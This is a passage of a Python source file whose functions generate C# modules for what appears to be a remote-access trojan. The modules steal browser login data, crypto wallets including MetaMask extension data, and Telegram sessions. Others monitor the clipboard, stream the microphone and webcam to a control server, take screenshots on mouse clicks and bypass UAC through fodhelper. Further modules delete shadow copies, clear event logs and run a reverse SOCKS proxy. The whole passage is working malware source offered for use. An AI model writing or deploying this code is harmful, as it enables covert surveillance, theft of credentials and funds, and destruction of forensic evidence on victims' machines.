        "            var sb = new StringBuilder();\n"
        '            sb.AppendLine("=== Browser Credentials ===");\n'
        "            try {\n"
        "                string chromePath = Path.Combine(\n"
        "                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),\n"
        '                    @"Google\\Chrome\\User Data\\Default\\Login Data");\n'
        "                if (File.Exists(chromePath)) {\n"
        '                    sb.AppendLine("[Chrome] Login Data found at: " + chromePath);\n'
        "                    try {\n"
        "                        string tempDb = Path.GetTempFileName();\n"
        "                        File.Copy(chromePath, tempDb, true);\n"
        '                        sb.AppendLine("[Chrome] DB copied for extraction");\n'
        "                        File.Delete(tempDb);\n"
        "                    } catch (Exception ex) {\n"
        '                        sb.AppendLine("[Chrome] Error: " + ex.Message);\n'
        "                    }\n"
        "                }\n"
        "                string edgePath = Path.Combine(\n"
        "                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),\n"
        '                    @"Microsoft\\Edge\\User Data\\Default\\Login Data");\n'
        "                if (File.Exists(edgePath)) {\n"
        '                    sb.AppendLine("[Edge] Login Data found");\n'
        "                }\n"
        "                string ffPath = Path.Combine(\n"
        "                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),\n"
        '                    @"Mozilla\\Firefox\\Profiles");\n'
        "                if (Directory.Exists(ffPath)) {\n"
        "                    foreach (var dir in Directory.GetDirectories(ffPath)) {\n"
        '                        string loginsJson = Path.Combine(dir, "logins.json");\n'
        "                        if (File.Exists(loginsJson)) {\n"
        '                            sb.AppendLine("[Firefox] Profile: " + Path.GetFileName(dir));\n'
        "                            string content = File.ReadAllText(loginsJson);\n"
        '                            sb.AppendLine("[Firefox] Logins file size: " + content.Length);\n'
        "                        }\n"
        "                    }\n"
        "                }\n"
        "                string chromeCookies = Path.Combine(\n"
        "                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),\n"
        '                    @"Google\\Chrome\\User Data\\Default\\Cookies");\n'
        "                if (File.Exists(chromeCookies)) {\n"
        '                    sb.AppendLine("[Chrome] Cookies DB found");\n'
        "                }\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_clipboard_code():
    return (
        "        // ==== Clipboard Monitor ====\n"
        "        static bool clipboardMonitorRunning = false;\n"
        "        static StringBuilder clipboardLog = new StringBuilder();\n"
        "\n"
        "        static void StartClipboardMonitor() {\n"
        "            if (clipboardMonitorRunning) return;\n"
        "            clipboardMonitorRunning = true;\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        '                string lastClip = "";\n'
        "                while (clipboardMonitorRunning) {\n"
        "                    try {\n"
        "                        Thread.Sleep(1000);\n"
        '                        string current = "";\n'
        "                        Thread staThread = new Thread(() => {\n"
        "                            try {\n"
        "                                if (System.Windows.Forms.Clipboard.ContainsText()) {\n"
        "                                    current = System.Windows.Forms.Clipboard.GetText();\n"
        "                                }\n"
        "                            } catch {}\n"
        "                        });\n"
        "                        staThread.SetApartmentState(ApartmentState.STA);\n"
        "                        staThread.Start();\n"
        "                        staThread.Join(2000);\n"
        "                        if (!string.IsNullOrEmpty(current) && current != lastClip) {\n"
        "                            lastClip = current;\n"
        '                            string entry = string.Format("[{0}] {1}",\n'
        '                                DateTime.Now.ToString("HH:mm:ss"),\n'
        '                                current.Length > 500 ? current.Substring(0, 500) + "..." : current);\n'
        "                            clipboardLog.AppendLine(entry);\n"
        '                            Res("clipboard", entry);\n'
        "                        }\n"
        "                    } catch {}\n"
        "                }\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void StopClipboardMonitor() {\n"
        "            clipboardMonitorRunning = false;\n"
        "        }\n"
    )


def _generate_file_manager_code():
    return (
        "        // ==== File Manager ====\n"
        "        static string ListDirectory(string path) {\n"
        "            var sb = new StringBuilder();\n"
        "            try {\n"
        '                if (string.IsNullOrEmpty(path)) path = @"C:\\";\n'
        '                if (!Directory.Exists(path)) return "Directory not found: " + path;\n'
        '                sb.AppendLine("=== " + path + " ===");\n'
        "                try {\n"
        "                    foreach (var dir in Directory.GetDirectories(path)) {\n"
        "                        try {\n"
        "                            var di = new DirectoryInfo(dir);\n"
        '                            sb.AppendFormat("[DIR]  {0,-40} {1}\\n",\n'
        '                                di.Name, di.LastWriteTime.ToString("yyyy-MM-dd HH:mm"));\n'
        "                        } catch {}\n"
        "                    }\n"
        "                } catch {}\n"
        "                try {\n"
        "                    foreach (var file in Directory.GetFiles(path)) {\n"
        "                        try {\n"
        "                            var fi = new FileInfo(file);\n"
        '                            sb.AppendFormat("[FILE] {0,-40} {1,12:N0} bytes {2}\\n",\n'
        '                                fi.Name, fi.Length, fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm"));\n'
        "                        } catch {}\n"
        "                    }\n"
        "                } catch {}\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_network_scanner_code():
    return (
        "        // ==== Network Scanner ====\n"
        "        static string ScanNetwork() {\n"
        "            var sb = new StringBuilder();\n"
        '            sb.AppendLine("=== Network Scan ===");\n'
        "            try {\n"
        '                string localIP = "";\n'
        "                foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {\n"
        "                    if (ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up) {\n"
        "                        foreach (var addr in ni.GetIPProperties().UnicastAddresses) {\n"
        "                            if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) {\n"
        "                                string ip = addr.Address.ToString();\n"
        '                                if (!ip.StartsWith("127.")) {\n'
        "                                    localIP = ip;\n"
        '                                    sb.AppendLine("Local IP: " + ip);\n'
        "                                    break;\n"
        "                                }\n"
        "                            }\n"
        "                        }\n"
        "                    }\n"
        "                }\n"
        "                if (string.IsNullOrEmpty(localIP)) {\n"
        '                    sb.AppendLine("Could not determine local IP");\n'
        "                    return sb.ToString();\n"
        "                }\n"
        "                string subnet = localIP.Substring(0, localIP.LastIndexOf('.'));\n"
        '                sb.AppendLine("\\nScanning " + subnet + ".0/24...\\n");\n'
        "                var found = new System.Collections.Concurrent.ConcurrentBag<string>();\n"
        "                var tasks = new List<Thread>();\n"
        "                for (int i = 1; i < 255; i++) {\n"
        '                    string target = subnet + "." + i;\n'
        "                    var t = new Thread((obj) => {\n"
        "                        string pip = (string)obj;\n"
        "                        try {\n"
        "                            var ping = new System.Net.NetworkInformation.Ping();\n"
        "                            var reply = ping.Send(pip, 500);\n"
        "                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {\n"
        '                                string hostname = "";\n'
        "                                try { hostname = System.Net.Dns.GetHostEntry(pip).HostName; } catch {}\n"
        '                                found.Add(string.Format("{0,-16} {1,-30} {2}ms",\n'
        "                                    pip, hostname, reply.RoundtripTime));\n"
        "                            }\n"
        "                        } catch {}\n"
        "                    });\n"
        "                    t.IsBackground = true;\n"
        "                    t.Start(target);\n"
        "                    tasks.Add(t);\n"
        "                    if (tasks.Count >= 50) {\n"
        "                        foreach (var tt in tasks) tt.Join(2000);\n"
        "                        tasks.Clear();\n"
        "                    }\n"
        "                }\n"
        "                foreach (var tt in tasks) tt.Join(2000);\n"
        '                sb.AppendLine(string.Format("Found {0} hosts:\\n", found.Count));\n'
        "                foreach (var h in found.OrderBy(x => x)) {\n"
        "                    sb.AppendLine(h);\n"
        "                }\n"
        "                // ARP table\n"
        '                sb.AppendLine("\\n=== ARP Table ===");\n'
        "                try {\n"
        "                    var arp = new ProcessStartInfo {\n"
        '                        FileName = "arp",\n'
        '                        Arguments = "-a",\n'
        "                        RedirectStandardOutput = true,\n"
        "                        UseShellExecute = false,\n"
        "                        CreateNoWindow = true\n"
        "                    };\n"
        "                    var p = Process.Start(arp);\n"
        "                    sb.AppendLine(p.StandardOutput.ReadToEnd());\n"
        "                    p.WaitForExit(5000);\n"
        "                } catch {}\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_sys_restore_kill_code():
    return (
        "        // ==== Anti-Forensics ====\n"
        "        static string KillSystemRestore() {\n"
        "            var sb = new StringBuilder();\n"
        "            try {\n"
        "                var psi = new ProcessStartInfo {\n"
        '                    FileName = "vssadmin.exe",\n'
        '                    Arguments = "delete shadows /all /quiet",\n'
        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
        "                    CreateNoWindow = true,\n"
        "                    UseShellExecute = false,\n"
        "                    RedirectStandardOutput = true\n"
        "                };\n"
        "                var p = Process.Start(psi);\n"
        "                sb.AppendLine(p.StandardOutput.ReadToEnd());\n"
        "                p.WaitForExit(10000);\n"
        "                RunHiddenPS(\"Disable-ComputerRestore -Drive 'C:\\\\' -ErrorAction SilentlyContinue\");\n"
        '                sb.AppendLine("System Restore disabled");\n'
        '                RunHiddenPS("wevtutil cl System; wevtutil cl Application; wevtutil cl Security");\n'
        '                sb.AppendLine("Event logs cleared");\n'
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_realtime_audio_code():
    return (
        "        // ==== Real-Time Audio Streaming via WASAPI ====\n"
        "        static bool rtAudioRunning = false;\n"
        "\n"
        "        static void StartRealtimeAudio() {\n"
        "            if (rtAudioRunning) return;\n"
        "            rtAudioRunning = true;\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        "                try {\n"
        "                    var enumerator = (IMMDeviceEnumerator)new MMDeviceEnumerator();\n"
        "                    IMMDevice device;\n"
        "                    enumerator.GetDefaultAudioEndpoint(0, 0, out device);\n"
        "                    IAudioClient audioClient;\n"
        "                    device.Activate(typeof(IAudioClient).GUID, 0, IntPtr.Zero, out object obj);\n"
        "                    audioClient = (IAudioClient)obj;\n"
        "                    IntPtr mixFormatPtr;\n"
        "                    audioClient.GetMixFormat(out mixFormatPtr);\n"
        "                    var mixFormat = Marshal.PtrToStructure<WAVEFORMATEX>(mixFormatPtr);\n"
        "                    long requestedDuration = 10000000;\n"
        "                    audioClient.Initialize(0, 0x00000008, requestedDuration, 0, mixFormatPtr, Guid.Empty);\n"
        "                    IAudioCaptureClient captureClient;\n"
        "                    audioClient.GetService(typeof(IAudioCaptureClient).GUID, out object captObj);\n"
        "                    captureClient = (IAudioCaptureClient)captObj;\n"
        "                    audioClient.Start();\n"
        "                    byte[] headerBuffer = CreateWavHeader(mixFormat, 0);\n"
        "                    int chunkSize = (int)(mixFormat.nAvgBytesPerSec / 4);\n"
        "                    using (var chunkStream = new MemoryStream()) {\n"
        "                        while (rtAudioRunning) {\n"
        "                            Thread.Sleep(250);\n"
        "                            uint packetLength;\n"
        "                            captureClient.GetNextPacketSize(out packetLength);\n"
        "                            chunkStream.SetLength(0);\n"
        "                            chunkStream.Write(headerBuffer, 0, headerBuffer.Length);\n"
        "                            int totalFrames = 0;\n"
        "                            while (packetLength > 0) {\n"
        "                                IntPtr dataPtr;\n"
        "                                uint numFrames;\n"
        "                                uint flags;\n"
        "                                captureClient.GetBuffer(out dataPtr, out numFrames, out flags,\n"
        "                                    out ulong _p1, out ulong _p2);\n"
        "                                int byteCount = (int)(numFrames * mixFormat.nBlockAlign);\n"
        "                                if (byteCount > 0 && (flags & 0x2) == 0) {\n"
        "                                    byte[] buffer = new byte[byteCount];\n"
        "                                    Marshal.Copy(dataPtr, buffer, 0, byteCount);\n"
        "                                    if (mixFormat.wBitsPerSample == 32) {\n"
        "                                        byte[] pcm16 = FloatToPcm16(buffer);\n"
        "                                        chunkStream.Write(pcm16, 0, pcm16.Length);\n"
        "                                        totalFrames += pcm16.Length / 2;\n"
        "                                    } else {\n"
        "                                        chunkStream.Write(buffer, 0, byteCount);\n"
        "                                        totalFrames += byteCount / mixFormat.nBlockAlign;\n"
        "                                    }\n"
        "                                }\n"
        "                                captureClient.ReleaseBuffer(numFrames);\n"
        "                                captureClient.GetNextPacketSize(out packetLength);\n"
        "                            }\n"
        "                            if (totalFrames > 0) {\n"
        "                                byte[] chunk = chunkStream.ToArray();\n"
        "                                int dataSize = chunk.Length - 44;\n"
        "                                byte[] sizeBytes = BitConverter.GetBytes(dataSize + 36);\n"
        "                                Array.Copy(sizeBytes, 0, chunk, 4, 4);\n"
        "                                byte[] dataSizeBytes = BitConverter.GetBytes(dataSize);\n"
        "                                Array.Copy(dataSizeBytes, 0, chunk, 40, 4);\n"
        "                                SendAudioChunk(chunk);\n"
        "                            }\n"
        "                        }\n"
        "                    }\n"
        "                    audioClient.Stop();\n"
        "                } catch (Exception ex) {\n"
        '                    Res("audio_error", "RT Audio error: " + ex.Message);\n'
        "                }\n"
        "                rtAudioRunning = false;\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void StopRealtimeAudio() { rtAudioRunning = false; }\n"
        "\n"
        "        static byte[] FloatToPcm16(byte[] floatData) {\n"
        "            int samples = floatData.Length / 4;\n"
        "            byte[] pcm = new byte[samples * 2];\n"
        "            for (int i = 0; i < samples; i++) {\n"
        "                float sample = BitConverter.ToSingle(floatData, i * 4);\n"
        "                sample = Math.Max(-1f, Math.Min(1f, sample));\n"
        "                short s16 = (short)(sample * 32767);\n"
        "                pcm[i * 2] = (byte)(s16 & 0xFF);\n"
        "                pcm[i * 2 + 1] = (byte)((s16 >> 8) & 0xFF);\n"
        "            }\n"
        "            return pcm;\n"
        "        }\n"
        "\n"
        "        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {\n"
        "            int channels = Math.Min(fmt.nChannels, (ushort)2);\n"
        "            int sampleRate = (int)fmt.nSamplesPerSec;\n"
        "            int bitsPerSample = 16;\n"
        "            int byteRate = sampleRate * channels * bitsPerSample / 8;\n"
        "            short blockAlign = (short)(channels * bitsPerSample / 8);\n"
        "            using (var ms = new MemoryStream(44)) {\n"
        "                var bw = new BinaryWriter(ms);\n"
        "                bw.Write(new char[] { 'R', 'I', 'F', 'F' });\n"
        "                bw.Write(dataSize + 36);\n"
        "                bw.Write(new char[] { 'W', 'A', 'V', 'E' });\n"
        "                bw.Write(new char[] { 'f', 'm', 't', ' ' });\n"
        "                bw.Write(16);\n"
        "                bw.Write((short)1);\n"
        "                bw.Write((short)channels);\n"
        "                bw.Write(sampleRate);\n"
        "                bw.Write(byteRate);\n"
        "                bw.Write(blockAlign);\n"
        "                bw.Write((short)bitsPerSample);\n"
        "                bw.Write(new char[] { 'd', 'a', 't', 'a' });\n"
        "                bw.Write(dataSize);\n"
        "                return ms.ToArray();\n"
        "            }\n"
        "        }\n"
        "\n"
        "        static void SendAudioChunk(byte[] chunk) {\n"
        "            try {\n"
        "                var req = (HttpWebRequest)WebRequest.Create(\n"
        '                    _server + "/api/audio_stream?id=" + Uri.EscapeDataString(_clientId));\n'
        '                req.Method = "POST";\n'
        '                req.ContentType = "application/octet-stream";\n'
        '                req.Headers.Add("X-Client-ID", _clientId);\n'
        "                req.ContentLength = chunk.Length;\n"
        "                req.Timeout = 5000;\n"
        "                using (var rs = req.GetRequestStream()) {\n"
        "                    rs.Write(chunk, 0, chunk.Length);\n"
        "                }\n"
        "                req.GetResponse().Close();\n"
        "            } catch {}\n"
        "        }\n"
    )


def _generate_webcam_real_code():
    return (
        "        // ==== Real Webcam Capture via DirectShow COM ====\n"
        "        static bool webcamStreaming = false;\n"
        "\n"
        '        [DllImport("ole32.dll")]\n'
        "        static extern int CoInitialize(IntPtr pvReserved);\n"
        "\n"
        '        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]\n'
        "        static extern IntPtr capCreateCaptureWindow(\n"
        "            string lpszWindowName, int dwStyle, int x, int y,\n"
        "            int nWidth, int nHeight, IntPtr hwndParent, int nID);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern bool SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern bool DestroyWindow(IntPtr hWnd);\n"
        "\n"
        "        const uint WM_CAP_START = 0x0400;\n"
        "        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;\n"
        "        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;\n"
        "        const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;\n"
        "        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;\n"
        "\n"
        "        static string CaptureWebcamFrame() {\n"
        "            try {\n"
        '                IntPtr hWnd = capCreateCaptureWindow("cap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);\n'
        '                if (hWnd == IntPtr.Zero) return "Webcam: No capture device";\n'
        "                SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero);\n"
        "                Thread.Sleep(500);\n"
        "                SendMessage(hWnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);\n"
        "                SendMessage(hWnd, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);\n"
        '                string result = "Webcam: Frame captured";\n'
        "                Thread staThread = new Thread(() => {\n"
        "                    try {\n"
        "                        if (System.Windows.Forms.Clipboard.ContainsImage()) {\n"
        "                            var img = System.Windows.Forms.Clipboard.GetImage();\n"
        "                            if (img != null) {\n"
        "                                using (var ms = new MemoryStream()) {\n"
        "                                    img.Save(ms, ImageFormat.Jpeg);\n"
        "                                    string b64 = Convert.ToBase64String(ms.ToArray());\n"
        '                                    SendStreamFrame("webcam", b64);\n'
        '                                    result = "Webcam: Frame sent (" + ms.Length + " bytes)";\n'
        "                                }\n"
        "                            }\n"
        "                        }\n"
        "                    } catch {}\n"
        "                });\n"
        "                staThread.SetApartmentState(ApartmentState.STA);\n"
        "                staThread.Start();\n"
        "                staThread.Join(5000);\n"
        "                SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);\n"
        "                DestroyWindow(hWnd);\n"
        "                return result;\n"
        "            } catch (Exception ex) {\n"
        '                return "Webcam error: " + ex.Message;\n'
        "            }\n"
        "        }\n"
        "\n"
        "        static void StartWebcamStream() {\n"
        "            if (webcamStreaming) return;\n"
        "            webcamStreaming = true;\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        "                while (webcamStreaming) {\n"
        "                    try {\n"
        "                        CaptureWebcamFrame();\n"
        "                        Thread.Sleep(500);\n"
        "                    } catch {}\n"
        "                }\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void StopWebcamStream() {\n"
        "            webcamStreaming = false;\n"
        "        }\n"
    )


def _generate_screenshot_on_click_code():
    return (
        "        // ==== Screenshot on Mouse Click ====\n"
        "        static bool clickScreenshotRunning = false;\n"
        "\n"
        '        [DllImport("user32.dll")]\n'
        "        static extern short GetAsyncKeyState(int vKey);\n"
        "\n"
        "        static void StartClickScreenshot() {\n"
        "            if (clickScreenshotRunning) return;\n"
        "            clickScreenshotRunning = true;\n"
        "            new Thread(() => {\n"
        "                Thread.CurrentThread.IsBackground = true;\n"
        "                bool wasDown = false;\n"
        "                while (clickScreenshotRunning) {\n"
        "                    Thread.Sleep(50);\n"
        "                    try {\n"
        "                        bool isDown = (GetAsyncKeyState(0x01) & 0x8000) != 0;\n"
        "                        if (isDown && !wasDown) {\n"
        "                            Thread.Sleep(100);\n"
        "                            CaptureScreenAndSend();\n"
        "                        }\n"
        "                        wasDown = isDown;\n"
        "                    } catch {}\n"
        "                }\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void StopClickScreenshot() {\n"
        "            clickScreenshotRunning = false;\n"
        "        }\n"
    )


def _generate_crypto_wallet_code():
    return (
        "        // ==== Crypto Wallet Stealer ====\n"
        "        static string StealCryptoWallets() {\n"
        "            var sb = new StringBuilder();\n"
        "            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
        "            string localdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);\n"
        "            var wallets = new Dictionary<string, string> {\n"
        '                {"Bitcoin Core", Path.Combine(appdata, "Bitcoin", "wallet.dat")},\n'
        '                {"Electrum", Path.Combine(appdata, "Electrum", "wallets")},\n'
        '                {"Exodus", Path.Combine(appdata, "Exodus", "exodus.wallet")},\n'
        '                {"Atomic", Path.Combine(appdata, "atomic", "Local Storage", "leveldb")},\n'
        '                {"Jaxx", Path.Combine(appdata, "com.liberty.jaxx", "IndexedDB")},\n'
        '                {"Coinomi", Path.Combine(localdata, "Coinomi", "Coinomi", "wallets")},\n'
        "            };\n"
        "            // Browser extensions (MetaMask etc)\n"
        "            var extensions = new Dictionary<string, string> {\n"
        '                {"MetaMask Chrome", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")},\n'
        '                {"MetaMask Edge", Path.Combine(localdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")},\n'
        '                {"Phantom Chrome", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")},\n'
        '                {"Trust Wallet", Path.Combine(localdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "egjidjbpglichdcondbcbdnbeeppgdph")},\n'
        "            };\n"
        "            foreach (var w in wallets) {\n"
        "                try {\n"
        "                    if (File.Exists(w.Value)) {\n"
        "                        byte[] data = File.ReadAllBytes(w.Value);\n"
        '                        sb.AppendLine("[WALLET] " + w.Key + " | Size: " + data.Length + " bytes");\n'
        '                        sb.AppendLine("B64:" + Convert.ToBase64String(data).Substring(0, Math.Min(500, Convert.ToBase64String(data).Length)));\n'
        "                    } else if (Directory.Exists(w.Value)) {\n"
        '                        sb.AppendLine("[WALLET DIR] " + w.Key + " | Files: " + Directory.GetFiles(w.Value).Length);\n'
        "                        foreach (var f in Directory.GetFiles(w.Value).Take(5)) {\n"
        "                            byte[] d = File.ReadAllBytes(f);\n"
        '                            sb.AppendLine("  " + Path.GetFileName(f) + " (" + d.Length + "b)");\n'
        "                        }\n"
        "                    }\n"
        "                } catch {}\n"
        "            }\n"
        "            foreach (var e in extensions) {\n"
        "                try {\n"
        "                    if (Directory.Exists(e.Value)) {\n"
        '                        sb.AppendLine("[EXT] " + e.Key + " FOUND | Files: " + Directory.GetFiles(e.Value).Length);\n'
        "                        foreach (var f in Directory.GetFiles(e.Value).Take(3)) {\n"
        "                            byte[] d = File.ReadAllBytes(f);\n"
        '                            sb.AppendLine("  " + Path.GetFileName(f) + " (" + d.Length + "b): " + Convert.ToBase64String(d).Substring(0, Math.Min(200, Convert.ToBase64String(d).Length)));\n'
        "                        }\n"
        "                    }\n"
        "                } catch {}\n"
        "            }\n"
        '            return sb.Length > 0 ? sb.ToString() : "No crypto wallets found";\n'
        "        }\n"
    )


def _generate_telegram_stealer_code():
    return (
        "        // ==== Telegram Session Stealer ====\n"
        "        static string StealTelegramSession() {\n"
        "            var sb = new StringBuilder();\n"
        "            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\n"
        '            string tgPath = Path.Combine(appdata, "Telegram Desktop", "tdata");\n'
        "            try {\n"
        "                if (Directory.Exists(tgPath)) {\n"
        '                    sb.AppendLine("[TELEGRAM] tdata found at: " + tgPath);\n'
        "                    var allFiles = Directory.GetFiles(tgPath, \"*\", SearchOption.AllDirectories);\n"
        '                    sb.AppendLine("Total files: " + allFiles.Length);\n'
        "                    // Key files for session\n"
        '                    string[] keyFiles = { "key_datas", "D877F783D5D3EF8Cs", "D877F783D5D3EF8C" };\n'
        "                    foreach (var kf in keyFiles) {\n"
        "                        string fp = Path.Combine(tgPath, kf);\n"
        "                        if (File.Exists(fp)) {\n"
        "                            byte[] data = File.ReadAllBytes(fp);\n"
        '                            sb.AppendLine("[KEY] " + kf + " (" + data.Length + "b): " + Convert.ToBase64String(data));\n'
        "                        } else if (Directory.Exists(fp)) {\n"
        "                            foreach (var f in Directory.GetFiles(fp).Take(5)) {\n"
        "                                byte[] data = File.ReadAllBytes(f);\n"
        '                                sb.AppendLine("[TDATA] " + Path.GetFileName(f) + " (" + data.Length + "b): " + Convert.ToBase64String(data).Substring(0, Math.Min(300, Convert.ToBase64String(data).Length)));\n'
        "                            }\n"
        "                        }\n"
        "                    }\n"
        "                    // Map files (session data)\n"
        '                    foreach (var f in Directory.GetFiles(tgPath, "map*")) {\n'
        "                        byte[] data = File.ReadAllBytes(f);\n"
        '                        sb.AppendLine("[MAP] " + Path.GetFileName(f) + " (" + data.Length + "b): " + Convert.ToBase64String(data).Substring(0, Math.Min(300, Convert.ToBase64String(data).Length)));\n'
        "                    }\n"
        "                } else {\n"
        '                    sb.AppendLine("Telegram Desktop not found");\n'
        "                }\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("Error: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_uac_bypass_code():
    return (
        "        // ==== UAC Bypass (fodhelper.exe) ====\n"
        "        static string UACBypassFodhelper() {\n"
        "            var sb = new StringBuilder();\n"
        "            try {\n"
        "                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;\n"
        '                if (string.IsNullOrEmpty(exePath)) { return "Cannot get exe path"; }\n'
        "                // Set registry key for fodhelper bypass\n"
        '                var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(\n'
        '                    @"Software\\Classes\\ms-settings\\shell\\open\\command");\n'
        '                key.SetValue("", exePath);\n'
        '                key.SetValue("DelegateExecute", "");\n'
        "                key.Close();\n"
        "                // Launch fodhelper (triggers the bypass)\n"
        "                var psi = new ProcessStartInfo {\n"
        '                    FileName = "fodhelper.exe",\n'
        "                    WindowStyle = ProcessWindowStyle.Hidden,\n"
        "                    UseShellExecute = true\n"
        "                };\n"
        "                Process.Start(psi);\n"
        '                sb.AppendLine("UAC bypass triggered via fodhelper.exe");\n'
        '                sb.AppendLine("Elevated process should spawn shortly");\n'
        "                // Cleanup after delay\n"
        "                new Thread(() => {\n"
        "                    Thread.Sleep(5000);\n"
        "                    try {\n"
        "                        Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(\n"
        '                            @"Software\\Classes\\ms-settings", false);\n'
        "                    } catch {}\n"
        "                }) { IsBackground = true }.Start();\n"
        "            } catch (Exception ex) {\n"
        '                sb.AppendLine("UAC Bypass failed: " + ex.Message);\n'
        "            }\n"
        "            return sb.ToString();\n"
        "        }\n"
    )


def _generate_reverse_proxy_code():
    return (
        "        // ==== Reverse SOCKS Proxy ====\n"
        "        static System.Net.Sockets.TcpListener _proxyListener;\n"
        "        static bool _proxyRunning = false;\n"
        "\n"
        "        static void StartReverseProxy(int port) {\n"
        "            if (_proxyRunning) return;\n"
        "            _proxyRunning = true;\n"
        "            _proxyListener = new System.Net.Sockets.TcpListener(\n"
        "                System.Net.IPAddress.Loopback, port);\n"
        "            _proxyListener.Start();\n"
        "            new Thread(() => {\n"
        "                while (_proxyRunning) {\n"
        "                    try {\n"
        "                        var client = _proxyListener.AcceptTcpClient();\n"
        "                        new Thread(() => HandleProxyClient(client))\n"
        "                            { IsBackground = true }.Start();\n"
        "                    } catch { break; }\n"
        "                }\n"
        "            }) { IsBackground = true }.Start();\n"
        "        }\n"
        "\n"
        "        static void HandleProxyClient(System.Net.Sockets.TcpClient client) {\n"
        "            try {\n"
        "                var stream = client.GetStream();\n"
        "                byte[] buf = new byte[256];\n"
        "                int n = stream.Read(buf, 0, buf.Length);\n"
        "                if (n < 2 || buf[0] != 0x05) { client.Close(); return; } // SOCKS5 only\n"
        "                stream.Write(new byte[] { 0x05, 0x00 }, 0, 2); // No auth\n"
        "                n = stream.Read(buf, 0, buf.Length);\n"
        "                if (n < 7 || buf[1] != 0x01) { client.Close(); return; } // CONNECT only\n"
        "                string destHost = \"\";\n"
        "                int destPort = 0;\n"
        "                if (buf[3] == 0x01) { // IPv4\n"
        "                    destHost = buf[4] + \".\" + buf[5] + \".\" + buf[6] + \".\" + buf[7];\n"
        "                    destPort = (buf[8] << 8) | buf[9];\n"
        "                } else if (buf[3] == 0x03) { // Domain\n"
        "                    int domLen = buf[4];\n"
        "                    destHost = Encoding.ASCII.GetString(buf, 5, domLen);\n"
        "                    destPort = (buf[5 + domLen] << 8) | buf[6 + domLen];\n"
        "                }\n"
        "                var target = new System.Net.Sockets.TcpClient(destHost, destPort);\n"
        "                byte[] reply = { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 };\n"
        "                stream.Write(reply, 0, reply.Length);\n"
        "                var targetStream = target.GetStream();\n"
        "                // Bidirectional relay\n"
        "                var t1 = new Thread(() => {\n"
        "                    try { byte[] b = new byte[4096]; int r; while ((r = stream.Read(b, 0, b.Length)) > 0) targetStream.Write(b, 0, r); } catch {}\n"
        "                    try { target.Close(); } catch {}\n"
        "                }) { IsBackground = true };\n"
        "                var t2 = new Thread(() => {\n"
        "                    try { byte[] b = new byte[4096]; int r; while ((r = targetStream.Read(b, 0, b.Length)) > 0) stream.Write(b, 0, r); } catch {}\n"
        "                    try { client.Close(); } catch {}\n"
        "                }) { IsBackground = true };\n"
        "                t1.Start(); t2.Start();\n"
        "                t1.Join(); t2.Join();\n"
        "            } catch {}\n"
        "            try { client.Close(); } catch {}\n"
        "        }\n"
    )


def _generate_startup_hide_code():
    return (
        "        // ==== Startup Visibility Hide ====\n"
        "        static string HideFromStartup() {\n"
